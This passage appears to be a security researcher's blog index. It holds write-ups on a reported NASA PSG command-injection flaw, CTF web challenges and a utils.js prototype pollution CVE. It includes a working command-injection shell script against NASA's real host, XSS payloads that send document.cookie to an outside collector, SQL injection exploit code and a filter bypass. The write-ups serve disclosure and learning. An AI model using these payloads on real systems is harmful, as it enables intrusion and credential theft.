 if ($indata) {    $nv = sscanf($txt,'%e %e %e', $lam, $flux, $noise); if ($nv&lt;2) continue;    $lams[$ndat]=$lam;    $vals[$ndat]=$flux;    $evals[$ndat]=$noise;    $ndat++;  } else {    if (strncmp($txt,'&lt;',1)!=0) continue;    $pky = strpos($txt,'&gt;'); if ($pky===false) continue; if ($pky&gt;=strlen($txt)-1) continue;    $ky  = substr($txt,1,$pky-1);    $val = substr($txt,$pky+1,strlen($txt)-$pky-1);    $lines[$iline]='&lt;' . $ky . '&gt;' . $val . PHP_EOL;    $iline++;  }}if ($iline&lt;=0) exit();$file = fopen($resdir . $ID . '_cfg.txt', 'w');for ($i=0;$i&lt;$iline;$i++) fwrite($file, $lines[$i]);fclose($file);if ($ndat&gt;0) {  $file = fopen($resdir . $ID . '_dat.txt', 'w');  if ($nv&gt;2) for ($i=0;$i&lt;$ndat;$i++) fprintf($file,\"%e %e %e\\n\", $lams[$i], $vals[$i], $evals[$i]); else for ($i=0;$i&lt;$ndat;$i++) fprintf($file,\"%e %e\\n\", $lams[$i], $vals[$i]);  fclose($file);}Additionally, before we exploit the above vulnerability, we should know one. If we send a request using the POST method, Server get the value of the file parameter and parse it into a file.So, at first I passed the data containing random value to the file parameter, but it doesn’t seem to work. It seemed like I had to put the data the parser needed. So I decided to look for a sample file on the NASA site.I found this, The psg_cfg.txt file can be downloaded from the above URL.&lt;OBJECT&gt;Exoplanet&lt;SURFACE-GAS-UNIT&gt;ratio&lt;GENERATOR-INSTRUMENT&gt;userThe value of psg_cfg.txt file are as above. I made some modifications to the file because the values are very long.import requestsurl = \"https://psg.gsfc.nasa.gov/api.php\"data = \"\"\"&lt;OBJECT&gt;Exoplanet&lt;SURFACE-GAS-UNIT&gt;ratio&lt;GENERATOR-INSTRUMENT&gt;user \"\"\"while True:    cmd = input(\"&gt;&gt; \")    r = requests.post(url,data={\"file\":data,\"wephm\":\"pocas;{}&gt;graphs/e1xnup1r;echo x\".format(cmd)})    print(requests.get(\"https://psg.gsfc.nasa.gov/graphs/e1xnup1r\").text)The final poc is as above.    Execute the PoC code and I saw Remote Code Execution happen!This was a very interesting and amazing! It was a good analysis and experience for me 😉 Thanks for help from @PewGrand, I learn a lot thanks to you!And Next Day, When I woke up from sleep and checked the vulnerability, it was patched! But they didn’t contact me. So I found out on Twitter that NASA is not responding to the vulnerability. So, if someone just finds it, it is to report it for the purpose of public interest. 😢  $wgeo='y';$wephm='n';$watm='n';$whdr='y';$wgen='y';- if (isset($_POST['wgeo']))  $wgeo = $_POST['wgeo'];  else $wgeo = 'y';- if (isset($_POST['wephm'])) $wephm= $_POST['wephm']; else $wephm= 'n';- if (isset($_POST['watm']))  $watm = $_POST['watm'];  else $watm = 'n';- if (isset($_POST['whdr']))  $whdr = $_POST['whdr'];  else $whdr = 'y';- if (isset($_POST['type']))  $otyp = $_POST['type'];  else $otyp = 'rad';- if (isset($_POST['mode']))  $mode = $_POST['mode'];  else $mode = '';+ if (isset($_POST['wgeo']))  $wgeo = preg_replace('/[^a-z]/', '', substr($_POST['wgeo'],0,1));  else $wgeo = 'y';+ if (isset($_POST['wephm'])) $wephm= preg_replace('/[^a-z]/', '', substr($_POST['wephm'],0,1)); else $wephm= 'n';+ if (isset($_POST['watm']))  $watm = preg_replace('/[^a-z]/', '', substr($_POST['watm'],0,1));  else $watm = 'n';+ if (isset($_POST['whdr']))  $whdr = preg_replace('/[^a-z]/', '', substr($_POST['whdr'],0,1));  else $whdr = 'y';+ if (isset($_POST['mode']))  $mode = preg_replace('/[^a-z]/', '', substr($_POST['mode'],0,1));  else $mode = '';  if ($otyp=='set' || $otyp=='upd') exit();  if ($otyp=='cfg' || $otyp=='ret') {                      $wcon='n'; $wgas='n'; $wgen='n';}  if ($otyp=='str' || $otyp=='srf') {$wgeo='n'; $watm='n'; $wcon='y'; $wgas='n'; $wgen='n';}  if ($otyp=='tel') {                $wgeo='n'; $watm='n'; $wcon='n'; $wgas='n'; $wgen='y';}# /var/www/html/api.phpThis issue was fixed that add substr() function. So I thought I try bypass this. But I decided not to do after to see the patch code.  this is impossible to bypass.Reporting Timeline  2021-11-22 13h 03m : Reported this issue via the soc@nasa.gov.  2021-11-23 ??h ??m : Patched this issue  2022-02-14 ??h ??m : Released a docker file"
  },
  
  {
    "title": "Hayyim CTF 2022 Write Up",
    "url": "/posts/Hayyim-CTF/",
    "categories": "",
    "tags": "",
    "date": "2022-02-14 08:29:53 +0900",
    





    
    "snippet": "SummaryThis weekend, Hayyim Security hosted the CTF, and I participated in it for about 3 ~ 4 hours and I was solved Cyberchef, Not E and Cyber Headchef challenges.(Web) Cyberchef [100 pts]The Cybe...",
    "content": "SummaryThis weekend, Hayyim Security hosted the CTF, and I participated in it for about 3 ~ 4 hours and I was solved Cyberchef, Not E and Cyber Headchef challenges.(Web) Cyberchef [100 pts]The Cyberchef is a simple XSS challenge. Cyberchef service is open source that provides encryption/decryption service and has 1-Day vulnerability.http://cyberchef:8000/#recipe=Scatter_chart('Line%20feed','Space',false,'','','red\"&gt;&lt;script&gt;fetch(\"https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/\".concat(document.cookie))&lt;/script&gt;',100,false)&amp;input=MTAwLCAxMDA1-Day issues can be found here. And I was able to get the flag by sending the above PoC to the admin bot.FLAG : hsctf{fa98fe3d32b4302aff1c322c925238a9d935b636f265cbfdd798391ca9c5a905}(Web) Not E [158 pts]The Not E challenge is a SQL Injection issue. In this problem, we are using our own binding function, not the Prepared Binding function provided by sqlite of Node, and this function has a vulnerability.const sqlite3 = require('sqlite3');const flag = require('fs').readFileSync('/flag').toString();class Database {  constructor(filename) {    this.db = new sqlite3.Database(filename);    this.db.serialize(() =&gt; {      this.run('create table members (username text, password text)');      this.run('create table posts (id text, title text, content text, owner text)');      this.run('create table flag (flag text)');      this.run('insert into flag values (?)', [ flag ]);    });  }// (skip..)I could see the FLAG were stored in a table called flag. So, in order to solve this challenge, we have to use SQL Injection to leak the flags contained in the table. Otherwise, read the /flag file using RCE, but this is not possible. Therefore, we should focus on SQL Injection.  /login  /logout  /new  /view/:noteIdFirst, the functions provided by the Note service are login, post writing, and post reading functions.const checkParam = (param) =&gt; {  if (typeof param !== 'string' || param.length === 0 || param.length &gt; 256) {    return false;  }  return true;};And all input values are type checked by checkParam function.  #formatQuery(sql, params = []) {    for (const param of params) {      if (typeof param === 'number') {        sql = sql.replace('?', param);      } else if (typeof param === 'string') {        sql = sql.replace('?', JSON.stringify(param.replace(/[\"\\\\]/g, '')));      } else {        sql = sql.replace('?', \"\"); // unreachable      }    }    return sql;  };In addition, all sql queries are using custom binding function. I thought there was a weakness here. The reason is that the server uses the custom binding function even though the node’s sqlite provides the binding function.In the formatQuery() function, after using the JSON.stringify() method to convert the input value into a string, you can see that the generated value and ‘?’ are replaced.JSON.stringify('Hello Pocas')'\"Hello Pocas\"'JSON.stringify(\"Hello Pocas\")'\"Hello Pocas\"'When JSON.stringify() is used, double quotation marks(“) are added to both ends of the string as shown above.insert into posts values ('noteid', \"\"?\"\", ?, ?)If you use the writing function and pass a question mark character as the value of title, the query is created as above. And when you check the value of the second argument of the query, you can see that a question mark is created after the string (“”), and the value of content is replaced with the question mark randomly generated. so you can escape the double quarter by this.import requestsimport uuidimport reurl = \"http://1.230.253.91:1000\"username = uuid.uuid4()print(\"[+] Exploit\")print(f\"[+] Username  : {username}\")sess = requests.Session()# Login/Registeraccount = {\"username\":username, \"password\":\"pocas\"}res = sess.post(url + '/login', data=account)# Leak the flagpoc = {\"title\":\"?\", \"content\":\",(select flag from flag),?)--\"}res = sess.post(url + '/new', data=poc)# Parse the flag pathflag_path = re.search('\\/view\\/[0-9a-z]*', sess.get(url).text).group()print(f\"[+] Flag Path : {flag_path}\")# Read the flagflag = re.search('hsctf\\{[0-9a-z]*\\}', sess.get(url + flag_path).text).group()print(f\"[+] Real FLAG : {flag}\")Finally I wrote the exploit code as above ⚡ root@pocas  ~  python3 poc.py[+] Exploit[+] Username  : 116588a5-5cb1-46e8-917e-5f7ea12408bf[+] Flag Path : /view/7fc3144da56dd8c9dbdfded1b3f35c44[+] Real FLAG : hsctf{038d083216a920c589917b898ff41fd9611956b711035b30766ffaf2ae7f75f2} ⚡ root@pocas  ~ FLAG : hsctf{038d083216a920c589917b898ff41fd9611956b711035b30766ffaf2ae7f75f2}(Web) Cyber Headchef [390 pts]The Cyber Headchef challenge is Cyberchef’s v2 and this is a 0-Day Challenge. (This is an unintended solution)app.post('/report', (req, res) =&gt; {  const url = req.body.url;  if (!checkUrl(url)) {    res.redirect('/?message=invalid argument');  } else if (unescape(url).indexOf('chart') !== -1) {    res.redirect('/?message=sorry, headchef doesn\\'t like chart!');  } else if (!checkRateLimit(req.ip)) {    res.redirect(`/?message=rate limited`);  } else {    visitUrl(url)      .then(() =&gt; res.redirect('/?message=reported'));  }});This is filtering the characters called chart among the function names used in the 1-Day exploit.  But this can be bypassed using null byte injectionhttp://cyberchef:8000/#recipe=Scatter_ch%00art('Line%20feed','Space',false,'','','red\"&gt;&lt;script&gt;fetch(\"https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/\".concat(document.cookie))&lt;/script&gt;',100,false)&amp;input=MTAwLCAxMDASo I was able to get the flag by sending the above PoC to the admin bot.FLAG : hsctf{be9e5b8bce203e203597dca3d67e0f7a38e359a9ab7799988e888be073c78da0}(Web/Not Solve) Gnuboard [498 pts]The Gnuboard challenge is to solve it using 0-Day. This challenge was so difficult that I couldn’t solve it while the competition was in progress, and after the competition I asked as3617.FROM ubuntu:20.04ARG DEBIAN_FRONTEND=noninteractiveRUN apt-get updateRUN apt-get install -y wget curl apache2 git php-gd php-mysql phpRUN git clone https://github.com/gnuboard/gnuboard5 /tmp/gnuboardRUN cp -r /tmp/gnuboard/* /var/www/htmlRUN sed -i 's/AllowOverride None/AllowOverride All/g' /etc/apache2/apache2.confWORKDIR /var/www/htmlRUN mkdir dataRUN chmod 777 dataRUN rm -rf index.html /tmp/gnuboardRUN echo '$flag = \"hsctf{flag_will_be_here}\";' &gt;&gt; /var/www/html/common.phpADD entrypoint.sh /CMD /entrypoint.shI could see in the docker file that the latest version of Gnuboard 5 was being used, and the flag was defined as a variable called $flag in common.php. So, after a long time, I started to analyze GnuBoard and found the SQL Injection vector, but it might not work well, and even if SQL Injection occurs, I don’t think I can do anything using it. So I had to give up.Hint : Gnuboard, It really has too many functions to be a just \"board\". It seems the way how they implement the payment is meh.Hayyim Security provided a hint because there was no solver for the challenge. Hint mentioned the payment part.include_once('./_common.php');// (Skip..)try {    //#############################    // 인증결과 파라미터 일괄 수신    //#############################    //      $var = $_REQUEST[\"data\"];    //#####################    // 인증이 성공일 경우만    //#####################    if (isset($_REQUEST['resultCode']) &amp;&amp; strcmp('0000', $_REQUEST['resultCode']) == 0) {        //############################################        // 1.전문 필드 값 설정(***가맹점 개발수정***)        //############################################        $charset = 'UTF-8';        // 리턴형식[UTF-8,EUC-KR](가맹점 수정후 고정)        $format = 'JSON';        // 리턴형식[XML,JSON,NVP](가맹점 수정후 고정)        // 추가적 noti가 필요한 경우(필수아님, 공백일 경우 미발송, 승인은 성공시, 실패시 모두 Noti발송됨) 미사용        //String notiUrl    = \"\";        $authToken = $_REQUEST['authToken'];   // 취소 요청 tid에 따라서 유동적(가맹점 수정후 고정)        $authUrl = $_REQUEST['authUrl'];    // 승인요청 API url(수신 받은 값으로 설정, 임의 세팅 금지)        $netCancel = $_REQUEST['netCancelUrl'];   // 망취소 API url(수신 받은f값으로 설정, 임의 세팅 금지)        ///$mKey = $util-&gt;makeHash(signKey, \"sha256\"); // 가맹점 확인을 위한 signKey를 해시값으로 변경 (SHA-256방식 사용)        $mKey = hash(\"sha256\", $signKey);        //#####################        // 2.signature 생성        //#####################        $signParam['authToken'] = $authToken;  // 필수        $signParam['timestamp'] = $timestamp;  // 필수        // signature 데이터 생성 (모듈에서 자동으로 signParam을 알파벳 순으로 정렬후 NVP 방식으로 나열해 hash)        $signature = $util-&gt;makeSignature($signParam);        //#####################        // 3.API 요청 전문 생성        //#####################        $authMap['mid'] = $default['de_kakaopay_mid'];   // 필수        $authMap['authToken'] = $authToken; // 필수        $authMap['signature'] = $signature; // 필수        $authMap['timestamp'] = $timestamp; // 필수        $authMap['charset'] = $charset;  // default=UTF-8        $authMap['format'] = $format;  // default=XML        //if(null != notiUrl &amp;&amp; notiUrl.length() &gt; 0){        //  authMap.put(\"notiUrl\"       ,notiUrl);        //}        try {            $httpUtil = new HttpClient();            //#####################            // 4.API 통신 시작            //#####################            $authResultString = \"\";            if ($httpUtil-&gt;processHTTP($authUrl, $authMap)) {                $authResultString = $httpUtil-&gt;body;            } else {                echo \"Http Connect Error\\n\";                echo $httpUtil-&gt;errormsg;                throw new Exception(\"Http Connect Error\");            }            //############################################################            //5.API 통신결과 처리(***가맹점 개발수정***)            //############################################################            $resultMap = json_decode($authResultString, true);            $tid = $resultMap['tid'];            $oid = preg_replace('/[^A-Za-z0-9\\-_]/', '', $resultMap['MOID']);            /*************************  결제보안 추가 2016-05-18 START ****************************/            $secureMap['mid']       = $default['de_kakaopay_mid'];                         //mid            $secureMap['tstamp']    = $timestamp;                   //timestemp            $secureMap['MOID']      = $resultMap['MOID'];           //MOID            $secureMap['TotPrice']  = $resultMap['TotPrice'];       //TotPrice            // signature 데이터 생성            $secureSignature = $util-&gt;makeSignatureAuth($secureMap);            /*************************  결제보안 추가 2016-05-18 END ****************************/            $sql = \" select * from {$g5['g5_shop_order_data_table']} where od_id = '$oid' \";            $row = sql_fetch($sql);            $data = isset($row['dt_data']) ? unserialize(base64_decode($row['dt_data'])) : array();            if(isset($data['pp_id']) &amp;&amp; $data['pp_id']) {                $page_return_url  = G5_SHOP_URL.'/personalpayform.php?pp_id='.$data['pp_id'];            } else {                $page_return_url  = G5_SHOP_URL.'/orderform.php';                if(get_session('ss_direct'))                    $page_return_url .= '?sw_direct=1';            }            if ((strcmp('0000', $resultMap['resultCode']) == 0) &amp;&amp; (strcmp($secureSignature, $resultMap['authSignature']) == 0) ) { //결제보안 추가 2016-05-18                /*                         * ***************************************************************************                 * 여기에 가맹점 내부 DB에 결제 결과를 반영하는 관련 프로그램 코드를 구현한다.                  [중요!] 승인내용에 이상이 없음을 확인한 뒤 가맹점 DB에 해당건이 정상처리 되었음을 반영함                  처리중 에러 발생시 망취소를 한다.                 * **************************************************************************** */                //최종결제요청 결과 성공 DB처리                $tno        = $resultMap['tid'];                $amount     = $resultMap['TotPrice'];                $app_time   = $resultMap['applDate'].$resultMap['applTime'];                $pay_method = $resultMap['payMethod'];                $pay_type   = $PAY_METHOD[$pay_method];                $depositor  = isset($resultMap['VACT_InputName']) ? $resultMap['VACT_InputName'] : '';                $commid     = '';                $mobile_no  = isset($resultMap['HPP_Num']) ? $resultMap['HPP_Num'] : '';                $app_no     = $resultMap['applNum'];                $card_name  = $CARD_CODE[$resultMap['CARD_Code']];                switch($pay_type) {                    case '계좌이체':                        $bank_name = $BANK_CODE[$resultMap['ACCT_BankCode']];                        if ($default['de_escrow_use'] == 1)                            $escw_yn         = 'Y';                        break;                    case '가상계좌':                        $bankname  = $BANK_CODE[$resultMap['VACT_BankCode']];                        $account   = $resultMap['VACT_Num'].' '.$resultMap['VACT_Name'];                        $app_no    = $resultMap['VACT_Num'];                        if ($default['de_escrow_use'] == 1)                            $escw_yn         = 'Y';                        break;                    default:                        break;                }                $inicis_pay_result = true;            } else {                $s = '(오류코드:'.$resultMap['resultCode'].') '.$resultMap['resultMsg'];                alert($s, $page_return_url);            }            // 수신결과를 파싱후 resultCode가 \"0000\"이면 승인성공 이외 실패            // 가맹점에서 스스로 파싱후 내부 DB 처리 후 화면에 결과 표시            // payViewType을 popup으로 해서 결제를 하셨을 경우            // 내부처리후 스크립트를 이용해 opener의 화면 전환처리를 하세요            //throw new Exception(\"강제 Exception\");        } catch (Exception $e) {            //    $s = $e-&gt;getMessage() . ' (오류코드:' . $e-&gt;getCode() . ')';            //####################################            // 실패시 처리(***가맹점 개발수정***)            //####################################            //---- db 저장 실패시 등 예외처리----//            $s = $e-&gt;getMessage() . ' (오류코드:' . $e-&gt;getCode() . ')';            echo $s;            //#####################            // 망취소 API            //#####################            $netcancelResultString = \"\"; // 망취소 요청 API url(고정, 임의 세팅 금지)            if ($httpUtil-&gt;processHTTP($netCancel, $authMap)) {                $netcancelResultString = $httpUtil-&gt;body;            } else {                echo \"Http Connect Error\\n\";                echo $httpUtil-&gt;errormsg;                throw new Exception(\"Http Connect Error\");            }            echo \"## 망취소 API 결과 ##\";            $netcancelResultString = str_replace(\"&lt;\", \"&amp;lt;\", $$netcancelResultString);            $netcancelResultString = str_replace(\"&gt;\", \"&amp;gt;\", $$netcancelResultString);            echo \"&lt;pre&gt;\", $netcancelResultString . \"&lt;/pre&gt;\";            // 취소 결과 확인        }    }// https://github.com/gnuboard/gnuboard5/blob/master/shop/kakaopay/pc_pay_result.phpThe above code is the Kakao Pay payment logic. The important thing here is to use the try/catch statement, and the vulnerability occurs in the catch statement.            if ($httpUtil-&gt;processHTTP($netCancel, $authMap)) {                $netcancelResultString = $httpUtil-&gt;body;            } else {                echo \"Http Connect Error\\n\";                echo $httpUtil-&gt;errormsg;                throw new Exception(\"Http Connect Error\");            }            echo \"## 망취소 API 결과 ##\";            $netcancelResultString = str_replace(\"&lt;\", \"&amp;lt;\", $$netcancelResultString);            $netcancelResultString = str_replace(\"&gt;\", \"&amp;gt;\", $$netcancelResultString);            echo \"&lt;pre&gt;\", $netcancelResultString . \"&lt;/pre&gt;\";// https://github.com/gnuboard/gnuboard5/blob/master/shop/kakaopay/pc_pay_result.php#L175L189The code above is executed when payment fails. Send a request to $netCancle using the $httpUtil-&gt;processHTTP() function, and store the return value in the $netcancelResultString variable. After that, I could see that variable variables were used twice in total by using the str_replace() function.0. HTTP Request$netcancelResultString = authToken1. First str_replace()$$netcancelResultString := $authToken = flag$netcancelResultString = flag2. Second str_replace()$$netcancelResultString := $flag$netcancelResultString = hsctf{~~~~}If the string called authToken is included in the value of $netcancelResultString after http request as above When the str_replace() function is called for the first time, the string called flag will be saved as the value of the $netcancelResultString variable by variable variables. ($authToken is flag)The second time the str_replace() function is called, the value of the $$netcancelResultString variable is the same as $flag, so the flag saved in common.php will be saved in the $netcancelResultString variable.        $authUrl = $_REQUEST['authUrl'];    // 승인요청 API url(수신 받은 값으로 설정, 임의 세팅 금지)        // https://github.com/gnuboard/gnuboard5/blob/master/shop/kakaopay/pc_pay_result.php#L33In order to generate an error, pass an incorrect URL as the value of authUrl. ⚡ root@pocas  ~  curl http://1.230.253.91:5000/shop/kakaopay/pc_pay_result.php\\?authUrl\\=http://\\&amp;netCancelUrl\\=https://6668197e65f7e3f7f5b45ff55a909ddd.m.pipedream.net/\\&amp;authToken\\=flag\\&amp;resultCode\\=0000Http Connect ErrorConnection failed (0) Failed to parse address \"\"Http Connect Error (오류코드:0)## 망취소 API 결과 ##&lt;pre&gt;hsctf{799c12711fd9d697a00ae3e6329a7979cc648d7cdae0fbb3d62f23a1f7c7f544}&lt;/pre&gt;&lt;br&gt;&lt;br&gt;결제 에러가 일어났습니다. 에러 이유는 위와 같습니다.Finally I got the flags by sending a request like above.FLAG : hsctf{799c12711fd9d697a00ae3e6329a7979cc648d7cdae0fbb3d62f23a1f7c7f544}Thanks to Hayyim Security for making these fun challenges. It’s been a long time since I studied a lot."
  },
  
  {
    "title": "Real World CTF 4th Hack into Skynet Write Up",
    "url": "/posts/RealWrold-CTF/",
    "categories": "",
    "tags": "",
    "date": "2022-01-25 08:29:53 +0900",
    





    
    "snippet": "There is no sql injection vulnerability in login logic, and login is generally not possible because there is no user account.def query_login_attempt():    username = flask.request.form.get('usernam...",
    "content": "There is no sql injection vulnerability in login logic, and login is generally not possible because there is no user account.def query_login_attempt():    username = flask.request.form.get('username', '')    password = flask.request.form.get('password', '')    if not username and not password:        return False    sql = (\"SELECT id, account\"           \"  FROM target_credentials\"           \"  WHERE password = '{}'\").format(hashlib.md5(password.encode()).hexdigest())    user = sql_exec(sql)    name = user[0][1] if user and user[0] and user[0][1] else ''    return name == usernameI’ve found some stupid logic in the code of the login logic. If the user variable is an empty value, the empty value of the name variable is put in, and finally the value of the name variable and the username variable is compared. Here, if the name variable and the username variable are both empty values, true is returned, so the login can be successful.As expected, the login was successful when the username value was passed as an empty value. Now that the login was successful, the search logic can be used.def query_kill_time():    name = flask.request.form.get('name', '')    if not name:        return None    sql = (\"SELECT name, born\"           \"  FROM target\"           \"  WHERE age &gt; 0\"           \"    AND name = '{}'\").format(name)    nb = sql_exec(sql)    if not nb:        return None    return '{}: {}'.format(*nb[0])SQL injection occurs because the value of name in the query_kill_time() function is passed as it is to the query.root@pocas:~# curl -i -H 'SessionId=22ab1d4b55f5a686c3c9947c0a5ad830' http://47.242.21.212:8086/ -d \"name='or 1=1 --\"HTTP/1.0 403 FORBIDDENContent-Type: text/htmlContent-Length: 234Server: Werkzeug/0.16.1 Python/3.8.10Date: Thu, 27 Jan 2022 08:15:34 GMT&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don\\'t have the permission to access the requested resource. It is either read-protected or not readable by the server.&lt;/p&gt;When attempting sql injection, it was found that the detection mechanism was controlled.(...)def skynet_detect():    req = {        'method': flask.request.method,        'path': flask.request.full_path,        'host': flask.request.headers.get('host'),        'content_type': flask.request.headers.get('content-type'),        'useragent': flask.request.headers.get('user-agent'),        'referer': flask.request.headers.get('referer'),        'cookie': flask.request.headers.get('cookie'),        'body': str(flask.request.get_data()),    }    _, result = skynet.classify(req)    return result and result['attack'](...)@app.route('/', methods=['GET', 'POST'])def do_query():    if skynet_detect():        return flask.abort(403)    if not query_login_state():        response = flask.make_response('No login, redirecting', 302)        response.location = flask.escape('/login')        return response    if flask.request.method == 'GET':        return flask.send_from_directory('', 'index.html')    elif flask.request.method == 'POST':        kt = query_kill_time()        if kt:            result = kt         else:            result = ''        return flask.render_template('index.html', result=result)    else:        return flask.abort(400)The reason is that the skynet_detect() function was being called before the query_kill_time() function was called. Here again the code was written with very stupid logic.skynet_detect()   : flask.request.get_data()query_kill_time() : flask.request.form.get()In the skynet_detect() function, the get_data() method was used, and in the query_kill_time() function, the form.get() method was used, and the body value was used. Why use it differently? I got a lot of doubts here, and I thought this would be important in solving the challenge.root@pocas:~# curl -i -H 'SessionId=22ab1d4b55f5a686c3c9947c0a5ad830' http://47.242.21.212:8086/ -d \"name='or 1=1 --\" -H \"Content-Type: application/json\"HTTP/1.0 403 FORBIDDENContent-Type: text/htmlContent-Length: 234Server: Werkzeug/0.16.1 Python/3.8.10Date: Thu, 27 Jan 2022 08:22:35 GMT&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don\\'t have the permission to access the requested resource. It is either read-protected or not readable by the server.&lt;/p&gt;root@pocas:~# curl -i -H 'SessionId=22ab1d4b55f5a686c3c9947c0a5ad830' http://47.242.21.212:8086/ -d \"name='or 1=1 --\" -H \"Content-Type: application/xml\"HTTP/1.0 403 FORBIDDENContent-Type: text/htmlContent-Length: 234Server: Werkzeug/0.16.1 Python/3.8.10Date: Thu, 27 Jan 2022 08:22:39 GMT&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don\\'t have the permission to access the requested resource. It is either read-protected or not readable by the server.&lt;/p&gt;So, while changing the value of Content-Type as above, I tried to bypass the detection mechanism by using the difference in parsing between the two functions. but no response. However, the important thing is that I did not use the file upload function using Multipart/form-data. When a file is uploaded, not only the file name and contents, but also various values exist as binary data. So I thought that if I tried using these functions, the values could be mixed and bypassed.As expected, it was strangely detoured.select string_agg(column_name, ','),null from information_schema.columns where table_name='target_credentials' --==&gt; -- id,account,password,access_key,secret_key: Noneselect string_agg(secret_key, ','),'f' from target_credentials --==&gt; -- rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n},92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937,92ed3ec5e34b68ab2c3984a1b5474937: fFLAG : rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}"
  },
  
  {
    "title": "0-Day, Prototype Pollution in utils.js",
    "url": "/posts/CVE-2021-3815/",
    "categories": "",
    "tags": "",
    "date": "2021-11-30 08:29:53 +0900",
    





    
    "snippet": "Summary  The @fabiocaccamo/utils.js is a package that provides methods with multiple functions for the convenience of developers. A vulnerability exists in one method included in this package.I dis...",
    "content": "Summary  The @fabiocaccamo/utils.js is a package that provides methods with multiple functions for the convenience of developers. A vulnerability exists in one method included in this package.I discovered a prototype pollution vulnerability via utils.js method analysis. In the 0.17.1 version package, Prototype Pollution occurs because the key value of the object is not checked within the set() method.Analysisset: function(obj, path, value)        {            var keys = path.split('.');            var key;            var cursor = obj;            for (var i = 0, j = keys.length; i &lt; j; i++) {                key = keys[i];                if (!TypeUtil.isObject(cursor[key])) {                    cursor[key] = {};                }                if (i &lt; (j - 1)) {                    cursor = cursor[key];                } else {                    cursor[key] = value;                }            }        }// https://github.com/fabiocaccamo/utils.js/blob/master/dist/utils.js#L2360If you check the set() method of utils.object.keypath, you can see that the value of the path parameter is split with dots, and then merged with the value of the value parameter based on the key value.const utils = require(\"@fabiocaccamo/utils.js\");const obj = {};const fake_obj = {};console.log(`[+] Before prototype pollution : ${obj.polluted}`);utils.object.keypath.set(fake_obj, '__proto__.polluted', true);console.log(`[+] After prototype pollution : ${obj.polluted}`);/* [+] Before prototype pollution : undefined[+] After prototype pollution : true*/I wrote PoC as above!~/npm-research/utils/prototype_pollution_via_set()❯ node poc.js[+] Before prototype pollution : undefined[+] After prototype pollution : true~/npm-research/utils/prototype_pollution_via_set()❯&gt; obj\t▼{}\t  ▼[[Prototype]]: Object\t     polluted: trueA prototype pollution vulnerability has occurred and you can see the object being polluted. I first found a prototype pollution in node module. this is my favourite vulnerability. So I’m very happy that I found it!Also, the vulnerability has been patched, so i have been assigned CVE-2021-3815 for this vulnerability! This is my first CVE.Patched             var cursor = obj;             for (var i = 0, j = keys.length; i &lt; j; i++) {                 key = keys[i];+                if (key === '__proto__') {+                    break;+                }                 if (!TypeUtil.isObject(cursor[key])) {                     cursor[key] = {};                 }# https://github.com/fabiocaccamo/utils.js/commit/d9ebbcdbcd7b89abeeb240952ff5ab01ca372a5fReporting Timeline  2021-11-30 21h 11m : Reported this issue via the huntr  2021-12-02 17h 24m : Validated this issue by Fabio Caccamo  2021-12-06 19h 46m : Patched this issue by Fabio Caccamo  2021-12-07 23h 57m : Requested a CVE for this issue by Jamie Slome  2021-12-09 12h 25m : Assigned the CVE-2021-3815Reference  Github Issue  Github Commit  Mitre  NVD  Snyk"
  },
  
  {
    "title": "DownUnderCTF 2021 Write Up",
    "url": "/posts/DownUnder-CTF/",
    "categories": "",
    "tags": "",
    "date": "2021-09-27 08:29:53 +0900",
    





    
    "snippet": "Web ChallengeInside Out [100 pts]  Inside Out 문제는 SSRF를 이용해 플래그를 획득하는 문제 입니다.문제로 들어오면 위와 같이 환영 한다고 인사를 해주며 밑에 Proxy Example라는 링크가 있는 것을 볼 수 있습니다.위 링크를 클릭 해 접속을 하면 위와 같이 url 파라미터를 이용해서 요청 한 후에 응답 값을...",
